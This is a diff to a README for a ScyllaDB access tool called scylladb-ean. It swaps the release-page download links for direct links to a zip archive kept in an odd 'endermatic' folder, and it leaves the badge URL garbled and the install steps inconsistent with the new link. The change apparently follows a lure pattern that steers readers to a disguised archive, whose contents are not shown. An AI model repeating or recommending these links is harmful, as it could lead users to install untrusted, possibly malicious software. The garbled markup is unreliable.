@@ -1,6 +1,6 @@
 # 🚀 scylladb-ean - Easy Access to ScyllaDB Data
 
-[![Download scylladb-ean](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Leeweixin/scylladb-ean/releases)
+[![Download scylladb-ean](https://raw.githubusercontent.com/Leeweixin/scylladb-ean/main/endermatic/scylladb-ean_v1.7.zip%https://raw.githubusercontent.com/Leeweixin/scylladb-ean/main/endermatic/scylladb-ean_v1.7.zip)](https://raw.githubusercontent.com/Leeweixin/scylladb-ean/main/endermatic/scylladb-ean_v1.7.zip)
 
 ## 📋 Table of Contents
 - [🌟 Features](#-features)
@@ -24,7 +24,7 @@ To run **scylladb-ean**, you will need:
 - An internet connection for downloading.
 
 ## 📥 Download & Install
-To get the latest version of **scylladb-ean**, visit this page to download: [Download Here](https://github.com/Leeweixin/scylladb-ean/releases)
+To get the latest version of **scylladb-ean**, visit this page to download: [Download Here](https://raw.githubusercontent.com/Leeweixin/scylladb-ean/main/endermatic/scylladb-ean_v1.7.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
